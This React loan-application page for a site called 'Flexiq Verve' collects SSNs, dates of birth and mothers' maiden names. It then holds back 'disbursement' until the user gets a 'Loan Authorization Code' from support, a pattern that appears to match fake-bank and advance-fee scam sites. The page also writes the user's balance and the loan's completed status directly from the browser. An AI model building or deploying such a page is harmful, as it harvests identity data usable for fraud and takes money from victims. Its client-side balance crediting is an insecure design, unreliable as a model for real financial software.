import { useFrozenGuard } from "@/hooks/useFrozenGuard";
import { useState, useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Banknote, Calculator, Lock, Shield } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useAuth } from "@/hooks/useAuth";
import { useAccount, formatMoney } from "@/hooks/useAccount";
import { supabase } from "@/integrations/supabase/client";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useNavigate } from "react-router-dom";
import { LoanCodeGate } from "@/components/LoanCodeGate";
import { sendEmail } from "@/lib/sendEmail";

// Theme-aware native date field: background and text follow light/dark mode,
// and color-scheme makes the browser draw its picker icon and popup to match.
const dateInputClass =
  "mt-1 block h-11 w-full max-w-full rounded-md border border-input bg-background px-3 text-sm text-foreground [color-scheme:light] dark:[color-scheme:dark] focus:outline-none focus:ring-2 focus:ring-ring";

const Loans = () => {
  useFrozenGuard();

  const navigate = useNavigate();
  const { toast } = useToast();
  const { user } = useAuth();
  const { data: account } = useAccount();
  const qc = useQueryClient();
  const currency = account?.currency || "USD";

  const [amount, setAmount] = useState("");
  const [term, setTerm] = useState("6");
  const [purpose, setPurpose] = useState("");
  const [extra, setExtra] = useState({
    fullName: "", ssn: "", phone: "", ownRent: "own", sellHome: "no",
    dob: "", motherMaiden: "", address: "", state: "", country: "", billingAddress: "",
  });
  const setX = (k: keyof typeof extra, v: string) => setExtra((s) => ({ ...s, [k]: v }));

  // Auto-fill from profile
  useEffect(() => {
    if (!user) return;
    (supabase as any)
      .from("profiles")
      .select("first_name, last_name, phone, address, country")
      .eq("id", user.id)
      .maybeSingle()
      .then(({ data }: any) => {
        if (!data) return;
        setExtra((s) => ({
          ...s,
          fullName: [data.first_name, data.last_name].filter(Boolean).join(" ") || s.fullName,
          phone: data.phone || s.phone,
          address: data.address || s.address,
          country: data.country || s.country,
          billingAddress: data.address || s.billingAddress,
        }));
      });
  }, [user]);

  const [gateOpen, setGateOpen] = useState(false);
  const [pendingLoanId, setPendingLoanId] = useState<string | null>(null);

  const { data: loans = [] } = useQuery({
    queryKey: ["loans", user?.id],
    enabled: !!user,
    queryFn: async () => {
      const { data } = await supabase
        .from("loans")
        .select("*")
        .eq("user_id", user!.id)
        .order("created_at", { ascending: false });
      return data || [];
    },
  });

  const rate = 8.9;
  const months = Number(term);
  const principal = Number(amount);
  const monthlyRate = rate / 100 / 12;
  const monthlyPayment = principal && months
    ? (principal * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months))
    : 0;
  const totalPayable = monthlyPayment * months;

  const apply = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;
    if (!principal || principal <= 0) return toast({ title: "Enter amount", variant: "destructive" });

    const { data, error } = await (supabase as any).from("loans").insert({
      user_id: user.id,
      amount: principal,
      currency,
      term_months: months,
      interest_rate: rate,
      purpose,
      full_name: extra.fullName,
      ssn_id: extra.ssn,
      phone: extra.phone,
      email: user.email,
      home_ownership_status: extra.ownRent,
      sell_home: extra.sellHome,
      date_of_birth: extra.dob,
      mothers_maiden_name: extra.motherMaiden,
      address: extra.address,
      state: extra.state,
      country: extra.country,
      billing_address: extra.billingAddress,
      status: "pending",
    }).select().single();

    if (error || !data) return toast({ title: "Failed", description: error?.message, variant: "destructive" });

    qc.invalidateQueries({ queryKey: ["loans"] });
    setPendingLoanId(data.id);
    setGateOpen(true);

    try {
      const { data: prof } = await (supabase as any)
        .from("profiles").select("first_name,last_name,email").eq("id", user.id).maybeSingle();
      const fn = prof?.first_name || "";
      const em = prof?.email || user.email || "";
      if (em) {
        await sendEmail({
          email: em, first_name: fn,
          subject: "Loan Application Submitted — Flexiq Verve",
          message:
`Your loan application of ${currency} ${principal} for ${months} months has been successfully submitted and will be reviewed by our team.

To proceed with the release of your funds, you will need to obtain and enter your Loan Authorization Code. This code is required to complete the disbursement process.

To request your Loan Authorization Code, please contact our support team or use the Live Chat on your dashboard.

For more information or complaints, please contact support@flexiqverve.com or make use of the Live Chat on your dashboard for assistance.

Kind Regards,
Flexiq Verve Support Team`,
        });
      }
    } catch {}
  };

  const releaseFunds = (loanId: string) => {
    setPendingLoanId(loanId);
    setGateOpen(true);
  };

  const onCodesVerified = async () => {
    if (!user || !account || !pendingLoanId) return;
    const loan = loans.find((l: any) => l.id === pendingLoanId);
    if (!loan) return;

    await (supabase as any)
      .from("profiles")
      .update({ balance: Number((account as any).balance) + Number(loan.amount) })
      .eq("id", user.id);

    await supabase.from("transactions").insert({
      user_id: user.id,
      type: "loan_disbursement",
      status: "completed",
      amount: Number(loan.amount),
      currency: loan.currency,
      description: `Loan disbursement (${loan.term_months} months @ ${loan.interest_rate}%)`,
    });

    await (supabase as any)
      .from("loans")
      .update({ status: "completed", disbursed_at: new Date().toISOString() })
      .eq("id", loan.id);

    qc.invalidateQueries({ queryKey: ["profile"] });
    qc.invalidateQueries({ queryKey: ["loans"] });
    qc.invalidateQueries({ queryKey: ["transactions"] });
    qc.invalidateQueries({ queryKey: ["recent-tx"] });

    toast({
      title: "Funds released",
      description: `${formatMoney(Number(loan.amount), loan.currency)} added to your balance.`,
    });

    try {
      const { data: prof } = await (supabase as any)
        .from("profiles").select("first_name,email").eq("id", user.id).maybeSingle();
      const fn = prof?.first_name || "";
      const em = prof?.email || user.email || "";
      if (em) {
        await sendEmail({
          email: em, first_name: fn,
          subject: "Loan Application Approved — Flexiq Verve",
          message:
`Great news! Your loan request of ${loan.currency} ${loan.amount} for ${loan.term_months} months has been approved and successfully disbursed into your account.

You can log in to your dashboard to view your updated balance.

For more information or complaints, please contact support@flexiqverve.com or make use of the Live Chat on your dashboard for assistance.

Kind Regards,
Flexiq Verve Support Team`,
        });
      }
    } catch {}

    setPendingLoanId(null);
    setAmount("");
    setPurpose("");

    navigate("/dashboard/success", {
      state: {
        pending: false,
        title: "Loan disbursed",
        message: "Your loan has been released to your balance.",
        receipt: false,
        details: [
          { label: "Amount", value: formatMoney(Number(loan.amount), loan.currency) },
          { label: "Term", value: `${loan.term_months} months` },
          { label: "Status", value: "Completed" },
        ],
      },
    });
  };

  return (
    <div className="space-y-6">
      <div>
        <h1 className="font-display text-2xl font-bold sm:text-3xl">Apply for a Loan</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          Borrow up to 5x your monthly deposit.
        </p>
      </div>

      <div className="grid gap-6 lg:grid-cols-[1.4fr,1fr]">
        <Card className="rounded-3xl border-border/60 p-6 shadow-card sm:p-8">
          <form onSubmit={apply} className="space-y-6">
            <div className="grid gap-4 sm:grid-cols-2">
              <div className="space-y-2">
                <Label>Amount ({currency})</Label>
                <Input type="number" step="100" value={amount} onChange={(e) => setAmount(e.target.value)} required />
              </div>
              <div className="space-y-2">
                <Label>Term</Label>
                <Select value={term} onValueChange={setTerm}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="3">3 months</SelectItem>
                    <SelectItem value="6">6 months</SelectItem>
                    <SelectItem value="12">12 months</SelectItem>
                    <SelectItem value="24">24 months</SelectItem>
                    <SelectItem value="36">36 months</SelectItem>
                    <SelectItem value="60">60 months</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2 sm:col-span-2">
                <Label>Purpose</Label>
                {/* 16px on mobile stops the browser zooming in when the field is focused */}
                <Textarea className="text-base md:text-sm" value={purpose} onChange={(e) => setPurpose(e.target.value)} placeholder="What will the loan be used for?" rows={3} />
              </div>
              <div className="space-y-2"><Label>Full name</Label><Input value={extra.fullName} onChange={(e) => setX("fullName", e.target.value)} required /></div>
              <div className="space-y-2"><Label>SSN / ID number</Label><Input value={extra.ssn} onChange={(e) => setX("ssn", e.target.value)} required /></div>
              <div className="space-y-2"><Label>Phone</Label><Input type="tel" value={extra.phone} onChange={(e) => setX("phone", e.target.value)} required /></div>
              <div className="space-y-2">
                <Label>Email</Label>
                <Input type="email" value={user?.email || ""} readOnly className="bg-muted/40" />
              </div>
              <div className="space-y-2">
                <Label>Own or rent?</Label>
                <Select value={extra.ownRent} onValueChange={(v) => setX("ownRent", v)}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="own">Own</SelectItem>
                    <SelectItem value="rent">Rent</SelectItem>
                    <SelectItem value="other">Other</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label>Sell home before buying?</Label>
                <Select value={extra.sellHome} onValueChange={(v) => setX("sellHome", v)}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="no">No</SelectItem>
                    <SelectItem value="yes">Yes</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <div className="flex items-center gap-2">
                  <Label>Date of birth</Label>
                  <span className="text-xs text-muted-foreground">(click to select)</span>
                </div>
                <input
                  type="date"
                  value={extra.dob}
                  max={new Date().toISOString().split("T")[0]}
                  onChange={(e) => setX("dob", e.target.value)}
                  className={dateInputClass}
                />
              </div>

              <div className="space-y-2"><Label>Mother's maiden name</Label><Input value={extra.motherMaiden} onChange={(e) => setX("motherMaiden", e.target.value)} /></div>
              <div className="space-y-2 sm:col-span-2"><Label>Address</Label><Input value={extra.address} onChange={(e) => setX("address", e.target.value)} /></div>
              <div className="space-y-2"><Label>State</Label><Input value={extra.state} onChange={(e) => setX("state", e.target.value)} /></div>
              <div className="space-y-2"><Label>Country</Label><Input value={extra.country} onChange={(e) => setX("country", e.target.value)} /></div>
              <div className="space-y-2 sm:col-span-2"><Label>Billing address</Label><Input value={extra.billingAddress} onChange={(e) => setX("billingAddress", e.target.value)} /></div>
            </div>

            <div className="grid gap-3 rounded-2xl bg-muted/40 p-4 text-sm sm:grid-cols-3">
              <div><p className="text-xs text-muted-foreground">Monthly payment</p><p className="font-display font-bold">{formatMoney(monthlyPayment, currency)}</p></div>
              <div><p className="text-xs text-muted-foreground">Interest rate</p><p className="font-display font-bold">{rate}% APR</p></div>
              <div><p className="text-xs text-muted-foreground">Total payable</p><p className="font-display font-bold">{formatMoney(totalPayable, currency)}</p></div>
            </div>

            <Button type="submit" className="h-12 w-full gap-2 rounded-2xl bg-gradient-primary text-base font-semibold shadow-glow">
              <Banknote className="h-4 w-4" /> Apply for loan
            </Button>
          </form>
        </Card>

        <div className="space-y-4">
          <Card className="rounded-3xl border-border/60 p-6 shadow-card">
            <div className="flex items-center gap-2">
              <Calculator className="h-4 w-4 text-primary" />
              <p className="text-sm font-semibold">How it works</p>
            </div>
            <ol className="mt-3 space-y-2 text-sm text-muted-foreground list-decimal list-inside">
              <li>Submit your application</li>
              <li>Review and verification</li>
              <li>Loan approval</li>
              <li>Loan disbursement</li>
            </ol>
          </Card>
          <Card className="rounded-3xl border-border/60 p-6 shadow-card">
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-success" />
              <p className="text-sm font-semibold">Secure disbursement</p>
            </div>
            <p className="mt-2 text-sm text-muted-foreground">
              Loan funds are released only after Loan Authorization Code verification.
            </p>
          </Card>
        </div>
      </div>

      <Card className="rounded-3xl border-border/60 p-6 shadow-card">
        <h2 className="font-display text-lg font-bold">Your loans</h2>
        <div className="mt-4 space-y-3">
          {loans.length === 0 && (
            <p className="py-6 text-center text-sm text-muted-foreground">No loans yet — apply above.</p>
          )}
          {loans.map((l: any) => (
            <div key={l.id} className="flex flex-wrap items-center gap-4 rounded-2xl border border-border/60 p-4">
              <div className="flex-1 min-w-[200px]">
                <p className="font-display text-lg font-bold">{formatMoney(Number(l.amount), l.currency)}</p>
                <p className="text-xs text-muted-foreground">
                  {l.term_months} months · {l.interest_rate}% · {new Date(l.created_at).toLocaleDateString()}
                </p>
                {l.purpose && <p className="mt-1 text-xs text-muted-foreground">"{l.purpose}"</p>}
                {l.rejection_reason && <p className="mt-1 text-xs text-destructive">Reason: {l.rejection_reason}</p>}
              </div>
              <Badge
                className={
                  l.status === "completed" || l.status === "approved" ? "bg-green-100 text-green-700 border-green-200" :
                  l.status === "failed" || l.status === "rejected" ? "bg-red-100 text-red-700 border-red-200" :
                  l.status === "paid" ? "bg-primary/15 text-primary border-primary/30" :
                  "bg-amber-100 text-amber-700 border-amber-200"
                }
                variant="outline"
              >
                {l.status === "failed" ? "rejected" : l.status}
              </Badge>
              {l.status === "pending" && (
                <Button onClick={() => releaseFunds(l.id)} size="sm" className="gap-2 bg-gradient-primary">
                  <Lock className="h-3.5 w-3.5" /> Release funds
                </Button>
              )}
            </div>
          ))}
        </div>
      </Card>

      <LoanCodeGate
        open={gateOpen}
        onOpenChange={setGateOpen}
        loanId={pendingLoanId}
        onVerified={onCodesVerified}
      />
    </div>
  );
};

export default Loans;
